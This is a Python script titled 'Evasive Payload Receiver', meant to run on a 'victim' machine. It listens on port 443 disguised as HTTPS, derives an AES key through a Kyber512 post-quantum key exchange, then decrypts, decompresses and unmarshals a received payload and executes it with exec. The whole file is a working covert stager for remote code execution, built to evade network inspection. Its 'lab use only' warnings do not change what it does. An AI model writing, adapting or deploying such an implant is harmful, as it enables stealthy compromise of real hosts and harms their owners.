#!/usr/bin/env python3
"""
Evasive Payload Receiver (PQC KEM + AES + Marshal + Zlib + TLS + HTTP Mimicry)
Runs on Receiver (e.g., Victim1 192.168.100.101).

Listens over TLS (mimics HTTPS), reads basic HTTP headers, decapsulates PQC KEM
to get AES key, receives chunked AES payload, decrypts, decompresses,
unmarshals, and then EXECUTES the code object.

*** EXTREMELY DANGEROUS - FOR LAB USE ONLY ***
"""
import socket
import struct
import marshal
import zlib
import traceback
import ssl
import base64
import oqs # Use oqs module

# WARNING: Ensure necessary imports for Crypto library
try:
    from Crypto.Cipher import AES
except ImportError:
    print("[!] Error: PyCryptodome not installed.")
    print("Run: pip install pycryptodome")
    exit(1)

# --- Configuration ---
LISTEN_IP = "0.0.0.0"          # Listen on all interfaces
LISTEN_PORT = 443             # Use standard HTTPS port
CERT_FILE = 'server.crt'      # Path to self-signed certificate
KEY_FILE = 'server.key'       # Path to private key for cert

# PQC KEM Configuration
PQC_KEM_ALG = "Kyber512" # Use the enabled algorithm

# --- RECEIVER'S PQC PRIVATE KEY (Base64 Encoded - Paste from generator output) ---
# Replace with the actual private key generated for the receiver
# Placeholder length (2176 chars) reflects Kyber512 private key size (1632 bytes) in Base64
RECEIVER_PQC_PRIVATE_KEY_B64 = "B"*2176 # <--- UPDATE THIS PLACEHOLDER LENGTH AND CONTENT
# -------------------------------------------------------------------------------
try:
    RECEIVER_PQC_PRIVATE_KEY = base64.b64decode(RECEIVER_PQC_PRIVATE_KEY_B64)
except Exception as e:
    print(f"[!] Invalid Base64 PQC Private Key provided or decode error: {e}")
    exit(1)


# Header format for chunk length
LENGTH_HEADER_FORMAT = '!I'
LENGTH_HEADER_SIZE = struct.calcsize(LENGTH_HEADER_FORMAT)
# Header format for PQC KEM ciphertext length
KEM_CT_HEADER_FORMAT = '!I'
KEM_CT_HEADER_SIZE = struct.calcsize(KEM_CT_HEADER_FORMAT)

# AES-GCM constants
NONCE_AES_SIZE = 16 # Bytes
TAG_AES_SIZE = 16   # Bytes
# --------------------

def receive_chunked_data(conn):
    """Receives length-prefixed chunks (AES payload part)."""
    full_data = bytearray()
    print("[*] Waiting to receive AES payload chunks...")
    while True:
        try:
            length_header = conn.recv(LENGTH_HEADER_SIZE)
            if not length_header:
                print("[*] Connection closed cleanly by sender (no more AES length headers).")
                break
            if len(length_header) < LENGTH_HEADER_SIZE:
                print("[!] Received incomplete AES length header. Connection issue?")
                return None
            chunk_len = struct.unpack(LENGTH_HEADER_FORMAT, length_header)[0]

            chunk = b''
            bytes_to_receive = chunk_len
            while len(chunk) < chunk_len:
                 part = conn.recv(bytes_to_receive - len(chunk))
                 if not part:
                      print("[!] Connection closed unexpectedly while receiving AES chunk data.")
                      return None
                 chunk += part
            full_data.extend(chunk)
        except ConnectionResetError:
            print("[!] Connection reset by peer.")
            return None
        except ssl.SSLWantReadError:
             print("[!] SSL Want Read error during chunk receive - possibly connection closed uncleanly.")
             return None
        except struct.error as e:
             print(f"[!] Struct unpacking error (invalid AES header?): {e}")
             return None
        except Exception as e:
            print(f"[!] Error receiving AES chunk data: {e}")
            traceback.print_exc()
            return None
    print(f"[*] Finished receiving AES payload ({len(full_data)} bytes total).")
    return bytes(full_data)

def process_aes_payload(aes_key, aes_encrypted_payload):
    """Decrypts (AES), decompresses (Zlib), and unmarshals the AES payload."""
    expected_aes_key_len = 32
    if len(aes_key) != expected_aes_key_len:
        print(f"[!] Warning: AES key length ({len(aes_key)}) does not match expected length ({expected_aes_key_len}).")

    # 1. Decrypt AES Payload
    if len(aes_encrypted_payload) < NONCE_AES_SIZE + TAG_AES_SIZE:
        print("[!] AES payload data too short for nonce/tag/ciphertext.")
        return None
    nonce_aes = aes_encrypted_payload[:NONCE_AES_SIZE]
    tag_aes = aes_encrypted_payload[NONCE_AES_SIZE:NONCE_AES_SIZE + TAG_AES_SIZE]
    ciphertext_aes = aes_encrypted_payload[NONCE_AES_SIZE + TAG_AES_SIZE:]
    try:
        print("[*] Decrypting AES payload...")
        cipher_aes = AES.new(aes_key, AES.MODE_GCM, nonce=nonce_aes)
        compressed_data = cipher_aes.decrypt_and_verify(ciphertext_aes, tag_aes)
        print(f"[+] AES decryption successful ({len(compressed_data)} bytes).")
    except ValueError as e:
        print(f"[!] AES Decryption/Verification FAILED: {e}. Check derived AES key or data integrity.")
        return None
    except Exception as e:
        print(f"[!] AES Decryption FAILED with unexpected error: {e}")
        return None

    # 2. Decompress
    try:
        print("[*] Decompressing data...")
        marshaled_code = zlib.decompress(compressed_data)
        print(f"[+] Decompression successful ({len(marshaled_code)} bytes).")
    except zlib.error as e:
        print(f"[!] Decompression FAILED: {e}. Invalid compressed data?")
        return None
    except Exception as e:
         print(f"[!] Decompression FAILED with unexpected error: {e}")
         return None

    # 3. Unmarshal - *** THE MOST DANGEROUS STEP ***
    try:
        print("[*] Unmarshaling data to code object...")
        code_object = marshal.loads(marshaled_code)
        print("[+] Unmarshaling successful.")
        return code_object
    except (TypeError, ValueError, EOFError, marshal.error) as e:
        print(f"[!] Unmarshaling FAILED: {e}. Data is likely corrupt or malicious.")
        print("[!] THIS IS A CRITICAL FAILURE POINT FOR SECURITY.")
        return None
    except Exception as e:
         print(f"[!] Unmarshaling FAILED with unexpected error: {e}")
         return None

def handle_connection(conn, addr):
    """Handles the incoming connection: Reads headers, KEM CT, AES Payload, processes."""
    print(f"[+] TLS connection established from {addr}")
    print(f"[*] Cipher used: {conn.cipher()}")

    # Initialize kem object outside the try block where it's used
    kem = None
    try:
        # Initialize the KEM object once, using the receiver's private key
        # Note: The KeyEncapsulation object in some liboqs versions needs the private key at initialization
        # if you intend to call decapsulation methods later.
        kem = oqs.KeyEncapsulation(PQC_KEM_ALG, RECEIVER_PQC_PRIVATE_KEY)

        # Read and discard HTTP Headers (Basic Mimicry)
        print("[*] Reading HTTP headers...")
        headers_raw = bytearray()
        while b'\r\n\r\n' not in headers_raw:
            part = conn.recv(1)
            if not part:
                print("[!] Connection closed while reading headers.")
                return
            headers_raw.extend(part)
        print(f"[+] Discarded {len(headers_raw)} bytes of HTTP headers.")

        # Receive PQC KEM Ciphertext Length and Ciphertext
        print("[*] Receiving PQC KEM Ciphertext...")
        kem_ct_header = conn.recv(KEM_CT_HEADER_SIZE)
        if not kem_ct_header or len(kem_ct_header) < KEM_CT_HEADER_SIZE:
            print("[!] Failed to receive KEM ciphertext header.")
            return
        kem_ct_len = struct.unpack(KEM_CT_HEADER_FORMAT, kem_ct_header)[0]
        print(f"[*] Expecting {kem_ct_len} bytes of KEM ciphertext...")

        kem_ciphertext = b''
        bytes_to_receive = kem_ct_len
        while len(kem_ciphertext) < bytes_to_receive:
            part = conn.recv(bytes_to_receive - len(kem_ciphertext))
            if not part:
                print("[!] Connection closed while receiving KEM ciphertext.")
                return
            kem_ciphertext += part
        print(f"[+] Received KEM ciphertext ({len(kem_ciphertext)} bytes).")

        # Decapsulate PQC KEM to get the shared secret (AES key)
        print(f"[*] Performing PQC KEM Decapsulation ({PQC_KEM_ALG}) using oqs...")
        try:
            # Use the user-confirmed decap_secret() method.
            # Based on generate_keys.py, it seems to only take the ciphertext.
            # The private key was likely associated when kem was initialized.
            shared_secret_aes_key = kem.decap_secret(kem_ciphertext) # USE USER-CONFIRMED METHOD
            print(f"[+] PQC KEM decapsulation successful. Derived {len(shared_secret_aes_key)}-byte AES key.")

        except oqs.MechanismNotSupportedError as e:
             print(f"[!] MechanismNotSupportedError: {e}")
             print(f"[!] Ensure the algorithm '{PQC_KEM_ALG}' is supported and enabled.")
             return
        except AttributeError as e:
            print(f"[!] AttributeError: {e}")
            print(f"[!] Method 'decap_secret' not found or requires different arguments. Check API.")
            return
        except Exception as e:
            # This might catch errors if the ciphertext is invalid or the wrong private key was implicitly used
            print(f"[!] PQC KEM decapsulation FAILED: {e}. Wrong private key or corrupt KEM ciphertext?")
            traceback.print_exc()
            return

        # Receive AES Payload (chunked)
        aes_encrypted_payload = receive_chunked_data(conn)

        if aes_encrypted_payload:
            # Process (decrypt AES, decompress Zlib, unmarshal)
            code_object = process_aes_payload(shared_secret_aes_key, aes_encrypted_payload)

            if code_object:
                print("\n" + "#" * 60)
                print("### !!! WARNING: EXECUTING RECEIVED CODE OBJECT !!! ###")
                print("#" * 60 + "\n")
                try:
                    # Execute the recovered code object - EXTREME RISK
                    exec(code_object, {'__builtins__': __builtins__})
                    print("\n" + "#" * 60)
                    print("### PAYLOAD EXECUTION FINISHED (Check Output Above) ###")
                    print("#" * 60)
                except Exception as e:
                    print("\n" + "!" * 60)
                    print(f"### !!! EXCEPTION DURING PAYLOAD EXECUTION: {e} !!! ###")
                    traceback.print_exc()
                    print("!" * 60)
            else:
                print("[!] Failed to process AES payload. Cannot execute.")
        else:
             print("[!] Failed to receive complete AES payload data.")

    except ssl.SSLError as e:
        print(f"[!] SSL Error during communication: {e}")
        traceback.print_exc()
    except Exception as e:
        print(f"[!] Unexpected error during connection handling: {e}")
        traceback.print_exc()
    finally:
         # Clean up kem object if it was created
         if kem:
             try:
                 # Some wrappers might have an explicit cleanup/free method
                 # kem.clean() # Example, check actual API if needed
                 pass
             except AttributeError:
                 pass # Ignore if no clean method
         print(f"[*] Closing connection from {addr}")
         try:
             conn.shutdown(socket.SHUT_RDWR)
         except Exception:
             pass
         conn.close()


def main():
    # Create SSL context for TLS server
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    try:
        context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
        print(f"[*] TLS context loaded successfully using {CERT_FILE} and {KEY_FILE}")
    except FileNotFoundError:
        print(f"[!] Error: Certificate ('{CERT_FILE}') or Key ('{KEY_FILE}') file not found.")
        print("[!] Generate them using the openssl command provided in the README.")
        return
    except ssl.SSLError as e:
         print(f"[!] Error loading certificate/key: {e}. Check file permissions and format.")
         return
    except Exception as e:
        print(f"[!] Unexpected error setting up TLS context: {e}")
        return

    # Create listening socket
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_sock.bind((LISTEN_IP, LISTEN_PORT))
        server_sock.listen(5)
        print(f"[*] Secure server listening on {LISTEN_IP}:{LISTEN_PORT} (Port {LISTEN_PORT} requires root privileges)...")
    except PermissionError:
         print(f"[!] Error: Permission denied to bind to port {LISTEN_PORT}. Use sudo.")
         return
    except OSError as e:
         if "Address already in use" in str(e):
              print(f"[!] Error: Address {LISTEN_IP}:{LISTEN_PORT} already in use. Is another instance running?")
         else:
              print(f"[!] Failed to bind or listen on {LISTEN_IP}:{LISTEN_PORT}: {e}")
         return
    except Exception as e:
        print(f"[!] Failed to bind or listen on {LISTEN_IP}:{LISTEN_PORT}: {e}")
        return

    # Main loop to accept connections
    try:
         print("[*] Waiting for a connection...")
         raw_conn, addr = server_sock.accept()
         print(f"\n[*] Accepted raw connection from {addr[0]}:{addr[1]}")

         # Wrap the connection with TLS
         print("[*] Wrapping connection with TLS...")
         ssl_conn = context.wrap_socket(raw_conn, server_side=True)

         # Handle the TLS connection
         handle_connection(ssl_conn, addr) # Function now closes conn

    except ssl.SSLError as e:
         print(f"[!] SSL Error during connection wrap or initial handshake: {e}")
    except KeyboardInterrupt:
         print("\n[*] Server shutting down on user request.")
    except Exception as e:
         print(f"[!] Error accepting or handling connection: {e}")
         traceback.print_exc()
    finally:
        print("[*] Closing server socket.")
        server_sock.close()


if __name__ == '__main__':
    main()